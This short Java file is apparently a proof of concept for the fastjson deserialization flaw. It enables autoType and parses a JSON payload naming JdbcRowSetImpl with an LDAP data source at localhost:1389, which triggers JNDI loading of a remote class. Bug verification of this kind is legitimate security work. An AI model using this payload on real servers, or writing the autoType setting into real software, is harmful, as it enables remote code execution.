package com.json;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.rowset.JdbcRowSetImpl;

/**
 * @description:验证fastjson的bug
 * 该bug在1.2.4X(1.2.24)之前都会出现，在1.2.58后修复
 *
 * @author jianhua.luo
 * @date 2019/7/18
 */
public class FastJsonBug {

    public static void main(String[] args) {
//        参考：https://blog.csdn.net/u013190417/article/details/124185734
//        ======================================================================
//        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
//        try {
//            jdbcRowSet.setDataSourceName("ldap://localhost:1389/#EXP");
//            jdbcRowSet.setAutoCommit(true);
//        } catch (SQLException throwables) {
//            throwables.printStackTrace();
//        }

        String exp = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://localhost:1389/#Calculator\", \"autoCommit\":true}";
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSON.parse(exp);
    }



}
